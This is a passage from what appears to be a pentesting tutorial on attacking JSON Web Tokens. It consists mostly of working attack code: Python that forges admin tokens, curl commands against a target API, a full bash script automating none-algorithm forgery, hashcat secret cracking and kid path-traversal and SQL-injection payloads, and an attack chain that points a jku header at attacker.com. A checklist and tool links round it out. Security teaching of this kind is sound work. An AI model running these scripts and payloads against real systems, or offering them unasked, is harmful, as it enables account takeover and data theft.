}, 'company_jwt_secret', algorithm='HS256')
print(token)
"
```

---

## Attack 7 — JWT Timing Attacks

### Expiration Bypass

```python [expiration_bypass.py]
import jwt, time

secret = "known_or_cracked_secret"

# Attack 1: Remove exp claim entirely
token_no_exp = jwt.encode(
    {"sub": "1", "role": "admin"},
    secret,
    algorithm="HS256"
)

# Attack 2: Set exp to maximum value
token_far_future = jwt.encode(
    {"sub": "1", "role": "admin", "exp": 9999999999},
    secret,
    algorithm="HS256"
)

# Attack 3: Set negative exp (some parsers may overflow)
token_negative = jwt.encode(
    {"sub": "1", "role": "admin", "exp": -1},
    secret,
    algorithm="HS256"
)

# Attack 4: Set exp as string (type confusion)
# Manual encoding needed — bypass library validation
import base64, json, hmac, hashlib

def forge(payload, secret):
    header = base64.urlsafe_b64encode(
        json.dumps({"alg":"HS256","typ":"JWT"}).encode()
    ).rstrip(b'=').decode()
    
    body = base64.urlsafe_b64encode(
        json.dumps(payload).encode()
    ).rstrip(b'=').decode()
    
    sig_input = f"{header}.{body}".encode()
    signature = base64.urlsafe_b64encode(
        hmac.new(secret.encode(), sig_input, hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    
    return f"{header}.{body}.{signature}"

# exp as string — may bypass numeric comparison
print(forge({"sub":"1","role":"admin","exp":"99999999999"}, secret))
```

### Token Reuse After Logout

```bash [Terminal]
# 1. Login and get token
TOKEN=$(curl -s -X POST https://target.com/api/login \
  -d '{"username":"user","password":"pass"}' | jq -r '.token')

# 2. Logout (supposed to invalidate)
curl -X POST https://target.com/api/logout \
  -H "Authorization: Bearer $TOKEN"

# 3. Try using the token again — does it still work?
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/profile

# ⚠ If it works → token is NOT invalidated server-side
# JWTs are stateless — most apps DON'T maintain a blacklist
```

---

## Automated JWT Testing — Complete Workflow

### jwt_tool — Full Scan

```bash [Terminal]
# Install
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip3 install -r requirements.txt

# Full automated scan (ALL attacks)
python3 jwt_tool.py "$TOKEN" -M at -t "https://target.com/api/admin" \
  -rh "Authorization: Bearer"

# Explanation of flags:
# -M at    → run All Tests
# -t       → target URL to test forged tokens against
# -rh      → request header format

# Individual attack modes:
python3 jwt_tool.py "$TOKEN" -X a          # None algorithm
python3 jwt_tool.py "$TOKEN" -X k -pk pub.pem  # Algorithm confusion
python3 jwt_tool.py "$TOKEN" -X s          # Embedded JWK
python3 jwt_tool.py "$TOKEN" -X i          # Inject header claims
python3 jwt_tool.py "$TOKEN" -C -d wordlist.txt  # Crack secret

# Tamper claims
python3 jwt_tool.py "$TOKEN" -T                    # Interactive tampering
python3 jwt_tool.py "$TOKEN" -T -pc role -pv admin # Set role=admin
python3 jwt_tool.py "$TOKEN" -T -pc sub -pv 1 -pc role -pv superadmin
```

### Burp Suite Extensions

::card-group
  ::card
  ---
  title: JSON Web Tokens (BApp)
  icon: i-lucide-puzzle
  to: https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6
  target: _blank
  ---
  Decode, edit, and resign JWTs directly in Burp Repeater. Essential for manual testing.
  ::

  ::card
  ---
  title: JWT Editor
  icon: i-lucide-file-key
  to: https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd
  target: _blank
  ---
  Advanced JWT manipulation with key generation, algorithm attacks, and embedded JWK injection.
  ::
::

### Automated Scan Script

::collapsible{name="Complete JWT Attack Automation Script"}

```bash [jwt_attack_all.sh]
#!/bin/bash
# Complete JWT Attack Automation
# Usage: ./jwt_attack_all.sh <token> <target_url> [public_key.pem]

TOKEN="$1"
TARGET="$2"
PUBKEY="${3:-public.pem}"
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${YELLOW}[*] JWT Attack Automation${NC}"
echo "=================================="

# Decode token
echo -e "\n${YELLOW}[*] Decoding Token${NC}"
echo "$TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -m json.tool
echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Extract algorithm
ALG=$(echo "$TOKEN" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -c "import sys,json; print(json.load(sys.stdin).get('alg','unknown'))")
echo -e "\n${YELLOW}[*] Algorithm: ${ALG}${NC}"

# Test 1: None algorithm
echo -e "\n${YELLOW}[*] Test 1: None Algorithm Attack${NC}"
for alg in "none" "None" "NONE" "nOnE"; do
    HEADER=$(echo -n "{\"alg\":\"${alg}\",\"typ\":\"JWT\"}" | base64 -w0 | tr '+/' '-_' | tr -d '=')
    PAYLOAD=$(echo "$TOKEN" | cut -d'.' -f2)
    FORGED="${HEADER}.${PAYLOAD}."
    
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Authorization: Bearer $FORGED" "$TARGET" 2>/dev/null)
    
    if [ "$STATUS" == "200" ]; then
        echo -e "${GREEN}[+] VULNERABLE! alg=${alg} returned HTTP ${STATUS}${NC}"
        echo "    Token: $FORGED"
    else
        echo -e "${RED}[-] alg=${alg} → HTTP ${STATUS}${NC}"
    fi
done

# Test 2: Secret brute force (if HMAC)
if [[ "$ALG" == HS* ]]; then
    echo -e "\n${YELLOW}[*] Test 2: Weak Secret Brute Force${NC}"
    if command -v hashcat &> /dev/null; then
        echo "$TOKEN" > /tmp/jwt_crack.txt
        hashcat -m 16500 /tmp/jwt_crack.txt /usr/share/wordlists/rockyou.txt --force --quiet 2>/dev/null
        RESULT=$(hashcat -m 16500 /tmp/jwt_crack.txt --show 2>/dev/null)
        if [ -n "$RESULT" ]; then
            echo -e "${GREEN}[+] SECRET FOUND: ${RESULT}${NC}"
        else
            echo -e "${RED}[-] Secret not in rockyou.txt${NC}"
        fi
        rm /tmp/jwt_crack.txt
    fi
fi

# Test 3: Algorithm confusion (if RSA)
if [[ "$ALG" == RS* ]] && [ -f "$PUBKEY" ]; then
    echo -e "\n${YELLOW}[*] Test 3: Algorithm Confusion (RS256→HS256)${NC}"
    python3 jwt_tool.py "$TOKEN" -X k -pk "$PUBKEY" -t "$TARGET" \
        -rh "Authorization: Bearer" 2>/dev/null
fi

# Test 4: Expired token reuse
echo -e "\n${YELLOW}[*] Test 4: Token Acceptance Check${NC}"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN" "$TARGET" 2>/dev/null)
echo "Current token → HTTP $STATUS"

# Test 5: kid injection
echo -e "\n${YELLOW}[*] Test 5: kid Header Injection${NC}"
for kid_payload in "../../dev/null" "' UNION SELECT ''--" "../../../../../../dev/null"; do
    echo "    Testing kid: $kid_payload"
    python3 jwt_tool.py "$TOKEN" -X i -hc kid -hv "$kid_payload" \
        -S hs256 -p "" -t "$TARGET" -rh "Authorization: Bearer" 2>/dev/null
done

echo -e "\n${YELLOW}[*] Attack automation complete${NC}"
```

::

---

## Defense Bypass Techniques

### When the Server Validates But Weakly

::accordion
  :::accordion-item{icon="i-lucide-shield-alert" label="Bypass: Server checks alg but allows multiple"}
  Some servers accept both `HS256` and `RS256`. They use the RSA public key for RS256 verification. Switch to HS256 and sign with the public key.
  
  ```bash [Terminal]
  # Check if server accepts different algorithms
  for alg in HS256 HS384 HS512 RS256 RS384 RS512 ES256 ES384 ES512 PS256 PS384 PS512 none; do
      HEADER=$(echo -n "{\"alg\":\"${alg}\",\"typ\":\"JWT\"}" | base64 -w0 | tr '+/' '-_' | tr -d '=')
      PAYLOAD=$(echo "$TOKEN" | cut -d'.' -f2)
      FORGED="${HEADER}.${PAYLOAD}."
      
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
          -H "Authorization: Bearer $FORGED" "$TARGET")
      echo "alg=$alg → HTTP $STATUS"
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-alert" label="Bypass: Server validates iss but not strictly"}
  ```json [Issuer Bypass Attempts]
  // Original
  {"iss": "https://auth.target.com"}
  
  // Try variations
  {"iss": "https://auth.target.com/"}     // trailing slash
  {"iss": "http://auth.target.com"}       // http vs https
  {"iss": "https://AUTH.TARGET.COM"}      // case variation
  {"iss": "https://auth.target.com:443"}  // explicit port
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-alert" label="Bypass: Server validates exp but with clock skew"}
  ```python [Clock Skew Exploit]
  import jwt, time

  # Some servers allow up to 5 minutes of clock skew
  payload = {
      "sub": "1",
      "role": "admin",
      "exp": int(time.time()) - 60  # expired 1 minute ago
      # Server with 5-min leeway still accepts!
  }
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-alert" label="Bypass: Server validates signature but not claims"}
  ```bash [Terminal]
  # If you have a valid low-privilege token and the secret is unknown:
  # Check if the server only validates the signature but not
  # individual claims

  # Method: Use Burp Suite to intercept the JWT and modify
  # only the Base64 payload (without re-signing)
  # Some implementations decode the payload BEFORE checking signature

  # In Burp Repeater, modify the payload portion directly
  # Change eyJzdWIiOiIxMzM3Iiwicm9sZSI6InVzZXIifQ
  # To the base64 of {"sub":"1","role":"admin"}
  # Keep original signature

  # This works if the app decodes payload first,
  # uses the values, THEN checks signature (race condition / logic flaw)
  ```
  :::
::

---

## Real-World Attack Scenarios

### Scenario 1 — E-Commerce Admin Takeover

```text [Attack Chain]

  ① Recon
  │  Browse target.com, register account
  │  Login → receive JWT in Authorization header
  │  Decode: {"sub":"5847","role":"customer","exp":1720086400}
  │
  ② Identify Algorithm
  │  Header: {"alg":"HS256","typ":"JWT"}
  │  HMAC-based → brute force is possible
  │
  ③ Crack Secret
  │  hashcat -m 16500 jwt.txt rockyou.txt
  │  Result: ecommerce_jwt_2023
  │
  ④ Forge Admin Token
  │  {"sub":"1","role":"admin","exp":9999999999}
  │  Sign with "ecommerce_jwt_2023"
  │
  ⑤ Access Admin Panel
  │  GET /api/admin/orders → all customer orders + payment data
  │  GET /api/admin/users → all user accounts + hashed passwords
  │  POST /api/admin/users/1/role → modify any user's role
  │
  ⑥ Impact: Full administrative access, PII exposure,
  │  financial data breach
```

### Scenario 2 — API Gateway Bypass via jku

```text [Attack Chain]

  ① Recon
  │  API at api.target.com uses RS256 JWTs
  │  Found /.well-known/jwks.json → public key obtained
  │  
  ② Attempt Algorithm Confusion
  │  RS256→HS256 with public key
  │  Result: Server validates alg whitelist → BLOCKED
  │  
  ③ Check jku Support
  │  Add "jku":"https://attacker.com/jwks.json" to header
  │  Host matching public key structure on attacker server
  │  
  ④ Server Fetches from jku?
  │  Received HTTP request on attacker server!
  │  Server trusts the jku URL
  │  
  ⑤ Generate Attacker Key Pair
  │  Host attacker's public key at /jwks.json
  │  Sign admin token with attacker's private key
  │  
  ⑥ Forge and Send
  │  Admin token with jku pointing to attacker server
  │  Server fetches attacker's key, verifies → VALID ✓
  │  
  ⑦ Impact: Full API access as any user/admin
```

### Scenario 3 — Microservice Lateral Movement

```text [Attack Chain]

  ① Initial Access
  │  Compromised low-privilege API token for "user-service"
  │  JWT secret found in exposed .env file on GitHub
  │  
  ② Token Analysis
  │  {"sub":"user-svc","aud":"user-service","scope":"users:read"}
  │  Same secret used across all microservices (common mistake)
  │  
  ③ Forge Service Tokens
  │  Target: payment-service
  │  {"sub":"payment-svc","aud":"payment-service","scope":"payments:all"}
  │  
  │  Target: admin-service
  │  {"sub":"admin-svc","aud":"admin-service","scope":"admin:all"}
  │  
  ④ Lateral Movement
  │  Access payment service → read all transactions
  │  Access admin service → create superadmin account
  │  Access database service → dump all collections
  │  
  ⑤ Impact: Complete infrastructure compromise via single secret
```

---

## JWT Security Checklist for Pentesters

::accordion
  :::accordion-item{icon="i-lucide-search" label="1. Reconnaissance"}
  - [ ] Decode the JWT and document all header fields and payload claims
  - [ ] Identify the algorithm (`alg` field)
  - [ ] Check for `kid`, `jku`, `jwk`, `x5u`, `x5c` in header
  - [ ] Look for JWKS endpoints (`/.well-known/jwks.json`, `/jwks.json`)
  - [ ] Check if public keys are accessible
  - [ ] Identify where the JWT is stored (cookie, localStorage, header)
  - [ ] Check cookie flags if stored as cookie (HttpOnly, Secure, SameSite)
  :::

  :::accordion-item{icon="i-lucide-key" label="2. Signature Attacks"}
  - [ ] **None algorithm** — all case variations, with/without trailing dot
  - [ ] **Algorithm confusion** — RS256→HS256 with public key
  - [ ] **Weak secret brute force** — hashcat, jwt_tool, john
  - [ ] **kid path traversal** — `/dev/null`, known files
  - [ ] **kid SQL injection** — UNION SELECT controlled value
  - [ ] **jku injection** — point to attacker's JWKS server
  - [ ] **jwk injection** — embed attacker's public key
  - [ ] **x5u/x5c injection** — attacker's certificate
  :::

  :::accordion-item{icon="i-lucide-user-cog" label="3. Claim Manipulation"}
  - [ ] Change `sub` to another user's ID (1, 0, admin)
  - [ ] Change `role` to admin/superadmin
  - [ ] Add `isAdmin: true` or similar flags
  - [ ] Modify `scope` to include admin permissions
  - [ ] Change `email` for password reset abuse
  - [ ] Remove `exp` for eternal tokens
  - [ ] Set `exp` to far future
  - [ ] Change `iss` and `aud` for cross-service access
  :::

  :::accordion-item{icon="i-lucide-clock" label="4. Token Lifecycle"}
  - [ ] Test expired token acceptance (clock skew)
  - [ ] Test token reuse after logout (blacklist bypass)
  - [ ] Test token reuse after password change
  - [ ] Test concurrent session handling
  - [ ] Check if refresh tokens are properly validated
  :::

  :::accordion-item{icon="i-lucide-git-branch" label="5. Architecture Attacks"}
  - [ ] Cross-service relay — use token from one service on another
  - [ ] Token confusion — use ID token as access token or vice versa
  - [ ] Refresh token abuse — use refresh token as access token
  - [ ] Check if different environments share keys (staging → production)
  :::
::

---

## Essential Tools

::card-group
  ::card
  ---
  title: jwt_tool
  icon: i-lucide-wrench
  to: https://github.com/ticarpi/jwt_tool
  target: _blank
  ---
  The Swiss Army knife of JWT testing — supports all known attacks, claim tampering, and automated scanning.
  ::

  ::card
  ---
  title: jwt.io
  icon: i-lucide-globe
  to: https://jwt.io/
  target: _blank
  ---
  Online JWT decoder and debugger. Paste any token to instantly see header, payload, and verify signatures.
  ::

  ::card
  ---
  title: hashcat (mode 16500)
  icon: i-lucide-cpu
  to: https://hashcat.net/hashcat/
  target: _blank
  ---
  GPU-accelerated JWT secret cracking. Mode 16500 handles HS256/HS384/HS512 at billions of guesses per second.
  ::

  ::card
  ---
  title: PortSwigger JWT Labs
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/jwt
  target: _blank
  ---
  Free hands-on labs covering every JWT vulnerability — from none algorithm to algorithm confusion to header injection.
  ::

  ::card
  ---
  title: JWT RFC 7519
  icon: i-lucide-file-text
  to: https://datatracker.ietf.org/doc/html/rfc7519
  target: _blank
  ---
  The official JWT specification. Understanding the RFC helps you find edge cases that libraries implement incorrectly.
  ::

  ::card
  ---
  title: Burp Suite JWT Editor
  icon: i-lucide-puzzle
  to: https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd
  target: _blank
  ---
  Burp extension for visual JWT editing, key generation, and attack automation within your intercepting proxy workflow.
  ::
::

---

::tip
JWT attacks are **high-impact, low-effort** vulnerabilities when they exist. Every web application pentest should include JWT analysis. Start with decoding, check the algorithm, try `none`, attempt brute force, and escalate from there. Practice on PortSwigger labs until the workflow becomes instinct.
::